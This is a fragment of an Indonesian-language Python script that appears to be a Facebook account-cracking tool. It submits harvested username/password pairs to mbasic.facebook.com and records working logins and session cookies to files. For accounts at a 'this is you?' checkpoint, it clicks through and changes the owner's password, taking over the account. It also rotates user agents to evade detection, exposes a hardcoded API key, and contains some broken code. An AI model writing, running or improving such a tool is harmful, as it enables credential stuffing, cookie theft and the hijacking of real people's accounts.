			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue

data = {}
data2 = {}

def mengecek(user,pw):
    color_ok = []
    global loop,ubah_pass,pwbaru
    session=requests.Session()
    ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
    url = "https://mbasic.facebook.com"
    session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pw})
    urlPost=session.post(url+link.get("action"),data=data)
    response=bs4.BeautifulSoup(urlPost.text, "html.parser")
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
        else:
            print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
            open('OK/OK-%s.txt'%(day), 'a').write(" %s|%s\n" % (user,pw))
    elif "checkpoint" in session.cookies.get_dict():
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url+link2.get("action"),data=data2)
        response2=bs4.BeautifulSoup(an.text,"html.parser")
        cek=[cek.text for cek in response2.find_all("option")]
        number=0
        print("\r%s%s \033[0m [+] Terdapat %s%s%s \033[0mOpsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "ubah_sandi" in ubah_pass:
                    dat,dat2={},{}
                    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
                    for x in response("input"):
                        if x.get("name") in but:
                            dat.update({x.get("name"):x.get("value")})
                    ubahPw=session.post(url+link2.get("action"),data=dat).text
                    resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
                    link3=resUbah.find("form",{"method":"post"})
                    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
                    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
                        for b in resUbah("input"):
                            dat2.update({b.get("name"):b.get("value")})
                        dat2.update({"password_new":"".join(pwbaru)})
                        an=session.post(url+link3.get("action"),data=dat2)
                        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                        print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
                        open('OK/OK-%s.txt' %(day), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
                else:
                    print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H,til))
                    tree = Tree(" ",guide_style=f"{color_ok}")
                    tree.add(Panel(f"{ua}",width=83,padding=(0,2),style=f"{color_ok}"))
                    prints(tree)
                    open('OK/OK-%s.txt' %(day), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(Panel("\r%s\033[0m akun terpasang autentikasi dua faktor			"%(M)))
            else:
                print("%s%s\033[0mterjadi kesalahan"%(M,til))
        else:
            if "c_user" in session.cookies.get_dict():
                print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
                open('OK/OK-%s.txt' %(day), 'a').write("%s%s|%s\n" % (H,user,pw))
            for opsi in range(len(cek)):
                number +=1
            jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
    elif "login_error" in str(response):
        oh = RuntimeError.find("div",{"id":"login_error"}).find("div").text
        print("%s %s"%(M,oh))
    else:
        tree = Tree(" ",guide_style=f"bold white")
        tree.add(Panel(f"login gagal, silahkan cek kembali id dan kata sandi",width=83,padding=(0,2),style=f"bold white"))
        prints(tree)
		  
def scarpping_ua():
    
    
    uascrap = []
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    
    
 
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
		  
#-----------------------[ DEFF SCRAPT METODE ]--------------------#
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 

def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\n [+] Program Selesai Dalam Waktu 0 Detik\n')
        

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	license()
